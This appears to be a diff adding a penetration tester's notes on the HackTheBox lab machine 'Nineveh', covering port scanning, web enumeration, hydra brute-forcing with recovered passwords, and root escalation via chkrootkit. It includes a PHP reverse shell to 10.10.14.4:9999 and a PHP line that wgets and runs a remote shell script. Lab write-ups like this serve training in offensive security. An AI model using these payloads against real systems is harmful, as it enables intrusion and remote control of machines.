@@ -1,0 +1,49 @@
+OS:
+- Linux (Ubuntu)
+
+Open Ports:
+- 80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
+- |_http-server-header: Apache/2.4.18 (Ubuntu)
+- |_http-title: Site doesn't have a title (text/html).
+- 443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
+- |_http-server-header: Apache/2.4.18 (Ubuntu)
+- |_http-title: Site doesn't have a title (text/html).
+- | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
+
+- enumerating port 80
+- login page: http://10.10.10.43/department/login.php
+- found comment on page: <!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
+- potential username: amrois
+
+
+- enumerating port 443
+- checking ssl cert for info
+potential user: admin
+not valid date
+- found login page:
+https://10.10.10.43/db/
+- service: phpliteadmin v1.9
+
+- running hydra to brute force both logins
+- found creds for :80/department
+[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
+
+- found creds for :443/db
+[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
+
+php cmd:
+<?php $sock=fsockopen("10.10.14.4",9999);exec("/bin/sh -i <&3 >&3 2>&3");
+
+
+<?php system("wget 10.10.14.4/shell.php -O /tmp/shell.php; php /tmp/shell.php"); ?>
+
+/var/tmp/hack.php
+
+- running pspy. commands of interest:
+2020/12/13 13:06:03 CMD: UID=0     PID=13981  | chown amrois:amrois /report/report-20-12-13:13:06.txt
+
+- found chkrootkit command
+- looking for priv esc exploits
+- can create a file in /tmp/upload that is being run as root
+- created file with reverse shell
+- root access
